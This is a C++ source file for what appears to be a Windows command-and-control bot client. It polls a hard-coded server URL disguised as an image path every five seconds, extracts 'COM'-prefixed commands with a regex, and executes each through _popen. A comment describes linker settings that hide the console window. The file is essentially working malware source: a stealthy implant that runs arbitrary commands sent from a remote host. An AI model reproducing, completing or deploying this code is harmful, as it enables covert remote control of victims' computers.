// C2client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <stdio.h>
#include <regex>
#include "curl/curl.h"
#include <stdexcept>


// To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
size_t getCommands(char* buff, size_t t, size_t nmemb, void* userData);
size_t executeCommands(std::vector<std::string>* list,CURL *curl);

int main()
{
	CURL* curlHandle;
	CURLcode response;
	std::vector<std::string> commandList;

	curlHandle = curl_easy_init();

	if (curlHandle) {
		//Set C2 URL
		curl_easy_setopt(curlHandle, CURLOPT_URL, "http://10.0.0.34:8080/images/tree.jpg");
		//Set buffer length
		curl_easy_setopt(curlHandle, CURLOPT_BUFFERSIZE, 4096L);
		//Set callback function
		curl_easy_setopt(curlHandle, CURLOPT_WRITEFUNCTION, getCommands);
		//Set callback Argument
		curl_easy_setopt(curlHandle, CURLOPT_WRITEDATA, &commandList);
		//Execute easy perform
		while (true) {
			//Grab the C2 html file with easy perform
			response = curl_easy_perform(curlHandle);
			if (response != CURLE_OK) {
				fprintf(stderr, "Curl perform failed: %s \n", curl_easy_strerror(response));
				//Sleep for 5 seconds before checking C2 server again
				Sleep(5000);
				continue;
			}
			//Execute commangs grabbed
			executeCommands(&commandList,curlHandle);
			//Sleep for 5 seconds before checking C2 server again
			Sleep(5000);
			

		}

	}
	else {
		fprintf(stderr, "Failed to init curl handle");
	}

	
	return 0;
}

size_t getCommands(char *buff, size_t t, size_t nmemb, void* userData) {
	//Pattern to grep for (C2 command will begin with "COM"
	std::regex pattern("COM([/-:a-zA-Z0-9]+)");
	//smatch variable to store commands identified in
	std::smatch match;
	//convert buff to string for analysis
	//Message from server (Will contain Command and unique bot ID)
	std::string value(buff,nmemb);
	std::string message;
	//Store message attributes in list
	std::vector<std::string>* list = (std::vector<std::string> *)userData;
	//Search for command parameter
	int position;
	std::string test;
	if (std::regex_search(value, match, pattern)) {
		std::string command;
		position = match.position();
		command = value.substr(position + 4, value.length() - 6 - position);
		list->push_back(command);
	}
	//system(command.c_str());
	return nmemb;
}

size_t executeCommands(std::vector<std::string>* list, CURL* curl) {
	
	//Iterate through commands and call them (Will need parsing later);
	for (auto n : *list) {
		char buff[4096];
		std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(n.c_str(), "rt"), &_pclose);
		if (!pipe) {
			fprintf(stderr, "Popen failed");
		}else{
			while (fgets(buff, sizeof(buff), pipe.get()) != nullptr) {
				OutputDebugStringA(buff);
			}
		}
	
	

		//Call System Commands
	}
	return true;
}
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
